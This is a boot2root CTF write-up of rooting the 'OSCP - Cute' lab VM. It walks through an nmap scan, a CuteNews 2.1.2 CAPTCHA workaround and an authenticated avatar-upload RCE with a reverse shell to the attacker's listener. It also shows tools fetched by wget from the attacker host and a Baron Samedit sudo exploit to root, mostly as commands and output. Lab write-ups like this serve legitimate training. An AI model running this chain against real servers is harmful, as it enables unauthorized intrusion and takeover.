# Boot2RootCTF: *OSCP - Cute*

*Note: This box was completed long ago and I am going off of the VMware snapshot I saved after completion, some visuals will be missing and explained instead.*

## Objective

We must go from visiting a simple website to having root access over the entire web server.

We'll download the VM from [here](https://www.vulnhub.com/entry/sickos-11,132/) and set it up with VMware Workstation 16.

Once the machine is up, we get to work.

## Step 1 - Reconnaissance

After finding our IP address using ```ifconfig``` and locating the second host on the network, we can run an Nmap scan to probe it for information.

```
sudo nmap -sS -Pn -v -T4 192.168.45.13
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-07 14:16 EDT
Initiating ARP Ping Scan at 14:16
Scanning 192.168.45.13 [1 port]
Completed ARP Ping Scan at 14:16, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:16
Completed Parallel DNS resolution of 1 host. at 14:16, 0.01s elapsed
Initiating SYN Stealth Scan at 14:16
Scanning 192.168.45.13 [1000 ports]
Discovered open port 995/tcp on 192.168.45.13
Discovered open port 110/tcp on 192.168.45.13
Discovered open port 22/tcp on 192.168.45.13
Discovered open port 80/tcp on 192.168.45.13
Discovered open port 88/tcp on 192.168.45.13
Completed SYN Stealth Scan at 14:36, 0.09s elapsed (1000 total ports)
Nmap scan report for 192.168.45.13
Host is up (0.00049s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
88/tcp  open  kerberos-sec
110/tcp open  pop3
995/tcp open  pop3s
MAC Address: 08:00:27:44:4D:4D (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
           Raw packets sent: 1001 (44.028KB) | Rcvd: 1001 (40.048KB)
```

Noticing that port 80 was open, I ran a gobuster directory scan on the IP address and found ```index.php```.

Upon accessing that file, I was presented with a CuteNews login page, which mentioned at the bottom of the page it was running version 2.1.2.

At this point I had all the information I needed to successfully infiltrate the host.

## Step 2 - Exploitation

When searching for exploits for CuteNews 2.1.2, I came across [this article](https://musyokaian.medium.com/cutenews-2-1-2-remote-code-execution-vulnerability-450f29673194), which explains how to perform an RCE through an authenticated file upload vulnerability.

More specifically, this exploit takes advantage of a poorly-coded file uploading feature intended to allow users to upload a profile 'avatar'.

But because it was an *authenticated* file uploading vulnerability, that meant I had to either steal someone else's account or make my own.

First, I tried to steal credentials from the site using an exploit found through ```searchsploit```.

```
searchsploit cutenews 2.1.2

--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)   | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                       | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload           | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                         | php/webapps/48800.py
--------------------------------------------------------------- ---------------------------------
```

In this case, I used the Python script, just because I didn't feel like using Metasploit was really necessary for this.

I located the script on my machine and copied it to my home directory to be able to use it.

However, using it wasn't much help.

```
sudo python3 48800.py

(*insert some cool ASCII title art here*)

Enter the URL> http://192.168.45.13/         
================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
[-] No hashes were found skipping!!!
================================================================

=============================
Registering a users
=============================
```

So either there were no accounts to steal, or the script just didn't work. Regardless, I was going to have to make my own account.

When registering for an account, it had a CAPTCHA that was failing to show up for some reason, essentially preventing me from making an account.

But from reading through the webpage's source code, the CAPTCHA was being generated on a ```captcha.php``` page with the help of a Math.random() function. The random function was being used to generate a number that gets stuck onto the end of the URL, acting like a token to tie the generated CAPTCHA string with the current request.

Therefore, to be able to access my CAPTCHA and submit it on the registration page, I had to go to ```http://192.168.45.13/captcha.php?r=0.988280552822965```, which presented me with a short string of characters, "homaqigu".

Putting this string into the CAPTCHA field of the registration page allowed me to successfully create my account, and I could now perform the exploit.

Using [this script](https://github.com/thewhiteh4t/cve-2019-11447), I was able to perform the malicious file upload to the CuteNews server.

```
sudo python3 cutenews/cve-2019-11447.py -t 192.168.45.13/index.php -u meowmycks -p catfoodman -lh 192.168.45.199

--------------------------------------
--- CVE-2019-11447 -------------------
--- CuteNews Arbitrary File Upload ---
--- CutePHP CuteNews 2.1.2 -----------
--------------------------------------

[>] Found By : Akkus       [ https://twitter.com/ehakkus     ]
[>] PoC By   : thewhiteh4t [ https://twitter.com/thewhiteh4t ]

[>] Target   : http://192.168.45.13/index.php/CuteNews/index.php
[>] Username : meowmycks
[>] Password : catfoodman

[!] Logging in...
[+] Logged In!
[+] Loading Profile...
[+] Searching Signatures...
[!] Uploading Payload...
[+] Loading Profile...
[+] Searching Avatar URL...
[*] URL : http://cute.calipendula/uploads/avatar_meowmycks_payload.php
[!] Payload will trigger in 5 seconds...
```

This first part of the script was working perfectly, and the file ```avatar_meowmycks_payload.php``` was now uploaded.

However, for whatever reason, it kept trying to connect to ```cute.calipendula``` instead of the IP address I had specified when I first ran the script, preventing it from completing and erroring out halfway through.

```
[!] Starting Listner...
[+] Trying to bind to :: on port 4444: Done
[o] Waiting for connections on :::4444

Exception in thread Thread-1 (trigger):
Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/urllib3/connection.py", line 174, in _new_conn
    conn = connection.create_connection(
  File "/usr/lib/python3/dist-packages/urllib3/util/connection.py", line 73, in create_connection
    for res in socket.getaddrinfo(host, port, family, socket.SOCK_STREAM):
  File "/usr/lib/python3.10/socket.py", line 955, in getaddrinfo
    for res in _socket.getaddrinfo(host, port, family, type, proto, flags):
socket.gaierror: [Errno -2] Name or service not known
```

But honestly, I didn't care enough to try and fix the script as it had already done the dirty work for me. All I had to do next was start the reverse connection.

Using BurpSuite (which I probably also didn't need to do), I captured a generic GET request and modified it to request my reverse shell payload.

```
GET /uploads/avatar_meowmycks_payload.php HTTP/1.1
Host: 192.168.45.13
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
...etc...
```

With a NetCat listener running, I was able to receive the incoming connection and gain access to the server.

```
sudo nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.199] from (UNKNOWN) [192.168.45.13] 35054
```

## Step 3 - Privilege Escalation

Now that I had a foothold in the server, I could focus on upgrading to root.

The first thing I did was start an HTTP server on my Kali box with Python using the command ```sudo python3 -m http.server 80```, allowing me to download my scripts from the target machine using ```wget``` requests.

```
sudo python3 -m http.server 80                                      
[sudo] password for meowmycks: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

I then downloaded a local copy of Linux Smart Enumeration (LSE) onto the target machine.

Kali:
```
192.168.45.13 - - [07/Jul/2022 15:15:05] "GET /lse.tar HTTP/1.1" 200 -
```
Target:
```
www-data@cute:/var/www/html/uploads$ wget http://192.168.45.199/lse.tar
wget http://192.168.45.199/lse.tar
--2022-07-07 21:15:05--  http://192.168.45.199/lse.tar
Connecting to 192.168.45.199:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12759040 (12M) [application/x-tar]
Saving to: 'lse.tar'
...
2022-07-07 21:15:06 (30.9 MB/s) - 'lse.tar' saved [12759040/12759040]
```

After decompressing and extracting the folder, I ran the enumeration script to reveal potential opportunities for privilege escalation.

Crucially, it found known vulnerabilities on the machine.

```
===================================================================( CVEs )=====                                                                                                                                                            
[!] cve-2019-5736 Escalate in some types of docker containers.............. nope
[!] cve-2021-3156 Sudo Baron Samedit vulnerability......................... yes!
---
Vulnerable! sudo version: 1.8.27
---
[!] cve-2021-3560 Checking for policykit vulnerability..................... nope
[!] cve-2021-4034 Checking for PwnKit vulnerability........................ yes!
---
Vulnerable!
---
[!] cve-2022-0847 Dirty Pipe vulnerability................................. nope
[!] cve-2022-25636 Netfilter linux kernel vulnerability.................... nope

==================================( FINISHED )==================================
```

LSE revealed that the machine was vulnerable to the Sudo Baron Samedit exploit and the PwnKit exploit.

For situations like this, I went out of my way to package custom exploits that could take advantage of any found known vulnerabilities.

Therefore, all I had to do was find the right one to use. In this case, I chose to use the Sudo Baron Samedit exploit, since there were several different variations I could use in case one or multiple failed. It's also my favorite one purely because of the exploit's name.

```
ww-data@cute:/var/www/html/uploads/lse$ cd exploits
cd exploits
www-data@cute:/var/www/html/uploads/lse/exploits$ ls
ls
netfilter
polkit.py
pwnkit.tar
sudobaron.tar
www-data@cute:/var/www/html/uploads/lse/exploits$ tar xf sudobaron.tar
tar xf sudobaron.tar
www-data@cute:/var/www/html/uploads/lse/exploits$ cd sudobaron
cd sudobaron
www-data@cute:/var/www/html/uploads/lse/exploits/sudobaron$ ls
ls
LICENSE
README.md
asm
exploit_cent7_userspec.py
exploit_defaults_mailer.py
exploit_nss.py
exploit_nss_d9.py
exploit_nss_manual.py
exploit_nss_u14.py
exploit_nss_u16.py
exploit_timestamp_race.c
exploit_userspec.py
gdb
```

Fortunately, it worked on the first try with the ```exploit_nss.py``` script, allowing me to become root.

```
www-data@cute:/var/www/html/uploads/lse/exploits/sudobaron$ python3 exploit_nss.py
<oads/lse/exploits/sudobaron$ python3 exploit_nss.py        
whoami
root
```

All I had to do now was get the flag.

```
cd /root
ls
localweb
root.txt
cat root.txt
0b18032c2d06d9e738ede9bc24795ff2
```

## Conclusion

This is the first box I've worked with where a file uploading vulnerability *actually* existed, instead of it being intentionally planted for the sake of learning.

It was also intriguing to have things go sideways a couple of times, which allowed me to really show off my adaptability skills by working around those caveats.

Overall this was super fun and, given that it came directly from OffSec's OSCP Lab repository, it helped me feel more confident in my abilities.
